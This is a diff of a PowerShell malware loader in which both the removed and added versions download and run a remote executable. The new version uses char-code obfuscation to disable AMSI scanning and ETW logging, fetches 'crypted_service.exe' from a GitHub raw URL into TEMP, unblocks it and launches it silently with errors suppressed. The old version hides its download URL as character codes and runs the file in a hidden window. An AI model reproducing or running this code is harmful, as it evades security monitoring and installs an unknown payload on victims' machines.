@@ -1,28 +1,15 @@
-$a = 104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,105,101,110,100,106,100,55,45,108,103,116,109,47,49,48,46,49,48,47,114,97,119,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115,101,114,118,105,99,101,46,101,120,101
-$u = -join ($a | ForEach-Object {[char]$_})
-$n = -join ((48..57 + 97..122) | Get-Random -Count 11 | ForEach-Object {[char]$_})
-$p = Join-Path $env:LOCALAPPDATA ($n + '.dat')
-
-$r = [System.Net.HttpWebRequest]::Create($u)
-$r.Method = 'GET'
-$r.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
-$r.Timeout = 25000
-$r.ReadWriteTimeout = 25000
-
-try {
-    $resp = $r.GetResponse()
-    $stream = $resp.GetResponseStream()
-    $fs = [System.IO.File]::OpenWrite($p)
-    $stream.CopyTo($fs)
-    $fs.Close()
-    $stream.Close()
-    $resp.Close()
-} catch {}
-
-Start-Sleep -Milliseconds (Get-Random -Minimum 900 -Maximum 2400)
-
-if (Test-Path $p) {
-    $p2 = $p -replace '\.dat$','.exe'
-    Rename-Item -Path $p -NewName (Split-Path $p2 -Leaf) -Force -ErrorAction SilentlyContinue
-    Start-Process -FilePath $p2 -WindowStyle Hidden -ErrorAction SilentlyContinue
+$ScriptDomain='LegacySX.bot.cd'
+$ScriptIsCf=$false
+$PayloadUrl='https://raw.githubusercontent.com/iendjd7-lgtm/10.10/refs/heads/main/crypted_service.exe'
+$w=[psobject].Assembly.GetType([string]::Join('',([char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]46,[char]77,[char]97,[char]110,[char]97,[char]103,[char]101,[char]109,[char]101,[char]110,[char]116,[char]46,[char]65,[char]117,[char]116,[char]111,[char]109,[char]97,[char]116,[char]105,[char]111,[char]110,[char]46,[char]65,[char]109,[char]115,[char]105,[char]85,[char]116,[char]105,[char]108,[char]115)))
+if($w){$f=[string]::Join('',([char]97,[char]109,[char]115,[char]105,[char]73,[char]110,[char]105,[char]116,[char]70,[char]97,[char]105,[char]108,[char]101,[char]100));$h=$w.GetField($f,[Reflection.BindingFlags]'NonPublic,Static');if($h){$h.SetValue($null,$true)}}
+$w=[psobject].Assembly.GetType([string]::Join('',([char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]46,[char]77,[char]97,[char]110,[char]97,[char]103,[char]101,[char]109,[char]101,[char]110,[char]116,[char]46,[char]65,[char]117,[char]116,[char]111,[char]109,[char]97,[char]116,[char]105,[char]111,[char]110,[char]46,[char]84,[char]114,[char]97,[char]99,[char]105,[char]110,[char]103,[char]46,[char]80,[char]83,[char]69,[char]116,[char]119,[char]76,[char]111,[char]103,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114)))
+if($w){$f=[string]::Join('',([char]101,[char]116,[char]119,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114));$h=$w.GetField($f,[Reflection.BindingFlags]'NonPublic,Static');if($h){$i=$h.GetValue($null);if($i){$n=[string]::Join('',([char]109,[char]95,[char]101,[char]110,[char]97,[char]98,[char]108,[char]101,[char]100));$g=$i.GetType().GetField($n,[Reflection.BindingFlags]'NonPublic,Instance');if($g){$g.SetValue($i,0)}}}}
+$ErrorActionPreference='SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol=3072
+$p=Join-Path $env:TEMP 'crypted_service.exe'
+try{(New-Object Net.WebClient).DownloadFile($PayloadUrl,$p)}catch{Start-BitsTransfer -Source $PayloadUrl -Destination $p}
+if((Test-Path $p) -and ((Get-Item $p).Length -gt 100000)){
+ Unblock-File $p
+ cmd /c start "" /B "$p"
 }
